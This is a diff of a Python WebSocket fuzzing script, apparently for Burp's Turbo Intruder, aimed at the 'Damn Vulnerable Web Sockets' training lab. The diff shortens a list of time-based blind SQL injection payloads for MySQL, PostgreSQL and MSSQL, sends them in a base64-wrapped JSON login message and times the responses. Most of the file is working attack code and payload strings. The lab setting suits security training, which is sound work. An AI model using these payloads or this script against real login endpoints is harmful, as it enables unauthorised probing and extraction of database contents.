@@ -1,45 +1,23 @@
 import base64
 import time
-
-# Constants for the base64-wrapped JSON payload
+# Damn Vulnerable Web Sockets example
+# Constants
 START_PAYLOAD = '{"auth_user":"YWRtaW4=","auth_pass":"'
 END_PAYLOAD = '"}'
 
 # Blind SQL Injection Payloads with Sleep Conditions for Different Databases & Contexts
 SLEEP_PAYLOADS = [
-    # Comment Evasion Techniques
-    "'/**/OR/**/SLEEP(1)/**/--",            # MySQL evasion
-    "';/**/SELECT/**/pg_sleep(1);/**/--",   # PostgreSQL evasion
-    "';/**/WAITFOR/**/DELAY/**/'00:00:01'; -- asdf",  # MSSQL evasion
 
     # Standard Sleep-Based Payloads
-    "' OR SLEEP(1); -- asdf",                   # MySQL standard
-    "'; SELECT pg_sleep(1); -- asdf",           # PostgreSQL standard
-    "'; WAITFOR DELAY '00:00:01'; -- asdf",     # MSSQL standard
+    "' OR SLEEP(1); -- asdf",
+    "'; SELECT pg_sleep(1); -- asdf",
+    "'; WAITFOR DELAY '00:00:01'; -- asdf",
 
     # Subquery-Based Payloads
-    "' OR (SELECT SLEEP(1)); -- asdf",          # MySQL with subquery
-    "' OR (SELECT pg_sleep(1)); -- asdf",       # PostgreSQL with subquery
-    "' OR (SELECT 1 FROM sys.dual WHERE 1=1 WAITFOR DELAY '00:00:01'); -- asdf",  # MSSQL subquery
+    "' OR (SELECT SLEEP(1)); -- asdf",
+    "' OR (SELECT pg_sleep(1)); -- asdf",
+    "' OR (SELECT 1 FROM sys.dual WHERE 1=1 WAITFOR DELAY '00:00:01'); -- asdf",
 
-    # Logical Conditions
-    "' OR IF(1=1, SLEEP(1), 0); -- asdf",       # MySQL boolean-based condition
-    "' OR CASE WHEN 1=1 THEN pg_sleep(1) ELSE null END; -- asdf",  # PostgreSQL CASE WHEN
-
-    # Time-Based Function Variations
-    "'; SELECT BENCHMARK(100000000, MD5('test')); -- asdf",  # MySQL CPU-based delay
-    "'; SELECT pg_sleep(random() * 2); -- asdf",  # PostgreSQL randomized sleep
-    "'; WAITFOR TIME '00:00:01'; -- asdf",  # MSSQL alternative time delay
-
-    # UNION-Based Payloads
-    "' UNION SELECT NULL, SLEEP(1), NULL -- asdf",      # MySQL UNION
-    "' UNION SELECT NULL, pg_sleep(1), NULL -- asdf",   # PostgreSQL UNION
-    "' UNION SELECT NULL, WAITFOR DELAY '00:00:01', NULL -- asdf",  # MSSQL UNION
-
-    # Time Delay via Extracted Data
-    "' OR (SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(1)); -- asdf",
-    "' OR (SELECT COUNT(*) FROM pg_tables WHERE pg_sleep(1)); -- asdf",
-    "' OR (SELECT COUNT(*) FROM sys.tables WHERE 1=1 WAITFOR DELAY '00:00:01'); -- asdf"
 ]
 
 current_payload_index = 0  # Track which payload is being tested
@@ -50,7 +28,7 @@ def queue_websockets(upgrade_request, message):
     """
     global current_payload_index
 
-    connection = websocket_connection.create(upgrade_request, Engine.BURP)
+    connection = websocket_connection.create(upgrade_request, Engine.TURBO)
     send_payload(connection, current_payload_index)
 
 def handle_outgoing_message(websocket_message, interesting):
@@ -68,7 +46,6 @@ def handle_incoming_message(websocket_message, interesting):
 
     global current_payload_index
 
-    # Log/store the incoming message
     elapsed_time = websocket_message.getTime()
 
     print "Elapsed Time:", elapsed_time
